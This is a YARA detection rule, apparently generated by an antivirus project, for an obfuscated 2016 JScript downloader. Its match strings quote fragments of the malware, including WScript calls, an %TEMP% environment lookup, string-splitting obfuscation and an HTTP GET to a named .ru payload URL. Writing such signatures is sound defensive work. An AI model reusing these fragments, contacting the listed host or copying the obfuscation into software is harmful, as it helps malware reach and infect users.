rule sig_20160428_b3da82278ee9c2db508286b065c25d65 {
  meta:
    description = "datamaliciousorder - file 20160428_b3da82278ee9c2db508286b065c25d65.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "13e94f3d967385d102204fbcf48ed5088fee24249efff8709f0c04d3c13eb90d"

  strings:
    $s1  = "function XmcHhgEzzDujQfiEfjMij(JsrKmkFnlUmyLmkOwpYxm){LrjOyfFrkDetAyeUfgJiv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function KcmTtgVbrEfjZhdAndEsn() {return LrjOyfFrkDetAyeUfgJiv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function XmcHhgEzzDujQfiEfjMij(JsrKmkFnlUmyLmkOwpYxm){LrjOyfFrkDetAyeUfgJiv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var LrjOyfFrkDetAyeUfgJiv = function DnzJuyMnvMehYmzDmcLcg() {return LotLlwAqwImnFwuVkuOek[HnzCvuBfpXozAlbKygUxl](\"WScript\"+\"" ascii
    $s5  = "function JimNsqFcsCxxFzhAupJfl(VydFdsHvuInsJjsQxxXci, EqeHnqDvvXylWfnMocFcc){TclRcqOkuMsjMiyQjoMmn = TclRcqOkuMsjMiyQjoMmn * 1; " ascii
    $s6  = "return VydFdsHvuInsJjsQxxXci - EqeHnqDvvXylWfnMocFcc;};" fullword ascii
    $s7  = "IajXjfLseVnvRuzNwwZka[ZjaUjxCsnAxsQgvCceZau](\"G\" + \"ET\", \"http://demo.sinelnikds.ru/b6sida\", false);" fullword ascii
    $s8  = "var LotLlwAqwImnFwuVkuOek = this[\"WScript\"];" fullword ascii
    $s9  = "var LrjOyfFrkDetAyeUfgJiv = function DnzJuyMnvMehYmzDmcLcg() {return LotLlwAqwImnFwuVkuOek[HnzCvuBfpXozAlbKygUxl](\"WScript\"+\"" ascii
    $s10 = "function KcmTtgVbrEfjZhdAndEsn() {return LrjOyfFrkDetAyeUfgJiv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function JimNsqFcsCxxFzhAupJfl(VydFdsHvuInsJjsQxxXci, EqeHnqDvvXylWfnMocFcc){TclRcqOkuMsjMiyQjoMmn = TclRcqOkuMsjMiyQjoMmn * 1; " ascii
    $s12 = "function JkuKtlDdsBdaIawGskFhh(){return HaxRniUydWftZliAbzKfg + \"\";};" fullword ascii
    $s13 = "if (IajXjfLseVnvRuzNwwZka[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function BkwBtzVjpDetGuhKtuEfp() {return ((AecWwjKfxHsuWxwKnqGbu == true) && (AecWwjKfxHsuWxwKnqGbu == FvjYrvFnzVmmWobUzeRzo)) ?" ascii
    $s15 = "function BkwBtzVjpDetGuhKtuEfp() {return ((AecWwjKfxHsuWxwKnqGbu == true) && (AecWwjKfxHsuWxwKnqGbu == FvjYrvFnzVmmWobUzeRzo)) ?" ascii
    $s16 = "KyfLcbDfqXjcXjxSfdSqe = true;" fullword ascii
    $s17 = "return JimNsqFcsCxxFzhAupJfl(1 == 1 ? XjpJgmBmjNtvPynHkwRbu : 0, 1 == 1 ? RvoReaYlmSdkEorVtwNhg : 0);" fullword ascii
    $s18 = "function CizLoyHufSylHfaAucSuq(){return 23;};" fullword ascii
    $s19 = "function ApgOfwRsgNkyFytGdwEkr(AzjAgvXlmMhpWavZhjEuv) {var LlhNodYrgIanGnrDtjDuc = (1, 2, 3, 4, 5, AzjAgvXlmMhpWavZhjEuv); retur" ascii
    $s20 = "function LhoXyxMwoGkxVgtJxlRkq()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}